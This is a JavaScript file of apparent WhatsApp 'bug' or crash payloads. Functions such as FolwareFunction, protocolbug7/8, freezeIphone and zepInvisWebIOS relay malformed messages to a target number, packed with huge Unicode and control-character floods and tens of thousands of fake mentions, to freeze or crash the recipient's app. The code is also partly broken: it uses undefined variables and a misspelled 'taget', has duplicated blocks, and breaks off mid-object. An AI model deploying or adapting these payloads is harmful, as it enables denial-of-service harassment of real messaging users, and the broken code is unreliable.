async function FolwareFunction(target, folware) {
  const folwaredellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
  const MassageFolware = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg = generateWAMessageFromContent(target, MSG, MassageFolware, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Folware Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function FolwareFunction2(target, folware) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u0003",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    
    const msg1 = generateWAMessageFromContent(target, generateMessage, {});
    
  const folwaredellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
  const MassageFolware = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg2 = generateWAMessageFromContent(target, MSG, MassageFolware, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Folware Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function FolwareFunction05(target, mention = false) {
  const floods = 40000;
  const baseMention = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    baseMention,
    ...Array.from({ length: floods }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
  ];

  const contextInfo = {
    mentionedJid: mentionedJids,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "⏤͟͟͞͞Folware nieh 🎓"
    }
  };

  const additionalMeta = [{
    tag: "meta",
    attrs: {},
    content: [{
      tag: "mentioned_users",
      attrs: {},
      content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
    }]
  }];

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 10,
      expectedVideoCount: 0
    }
  }, { userJid: target, upload: sock.waUploadToServer });

  await sock.relayMessage(target, album.message, { messageId: album.key.id });

    const photo = {
    image: {
    url: "https://example.com/image.jpg"
  },
    caption: "⏤͟͟͞͞Folware nieh 🎓"
  };

  for (let i = 0; i < 10; i++) {
    const msg = await generateWAMessage(target, photo, { upload: sock.waUploadToServer });
    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      ...contextInfo,
      messageAssociation: { associationType: 1, parentMessageKey: album.key }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: additionalMeta
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
      });
    }
  }

  const video = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc",
          mimetype: "video/mp4",
          fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
          fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
          mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
          height: 1280, width: 720, seconds: 14,
          contextInfo,
          streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ",
          thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o="
        }
      }
    }
  };

  const sticker = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          mediaKeyTimestamp: Date.now(),
          isAnimated: true,
          contextInfo
        }
      }
    }
  };

  const audio = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc",
          mimetype: "audio/mpeg",
          fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
          fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
          mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
          seconds: 24,
          fileLength: "389948",
          caption: "⏤͟͟͞͞Folware nieh 🎓",
          contextInfo
        }
      }
    }
  };

  for (const content of [video, sticker, audio]) {
    const msg = await generateWAMessageFromContent(target, content, { userJid: target });
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: additionalMeta
    });
  }

  console.log(`[+] Finished folware bug combined on ${target} with mention = ${mention}`);
} 

async function protocolbug7(sock, target, mention) {
    const mentionedList = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`)
    ];

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: { low: 999999999, high: 0, unsigned: true },
        seconds: 600,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆",
        height: 1280,
        width: 720,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: true },
        contextInfo: {
            mentionedJid: mentionedList,
            forwardingScore: 999,
            isForwarded: true,
            entryPointConversionSource: "non_contact",
            forwardingScore: 9999,
            groupMentions: [],
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343289@newsletter",
                serverMessageId: 1000000,
                newsletterName: "x!s - rizxvelz"
            }
        },
        thumbnail: Buffer.from("00", "hex"),
        streamingSidecar: Buffer.alloc(1024 * 512).toString("base64")
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protocolbug8(sock, target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await sock.relayMessage(taget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}

async function freezeIphone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "i p h o n e - f r e e z e" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function zepInvisWebIOS(target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "乙乇卩ㄚ ⭒ ㄒ卂ᐯ乇尺几" + "𑆿".repeat(15000),
         address: "乙乇卩ㄚ ⭒ ㄒ卂ᐯ乇尺几" + "𑆿".repeat(5000),
         url: `https://zephysock.my.id${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "",
            matchedText: "",
            description: "".repeat(15000),
            title: "" + "".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
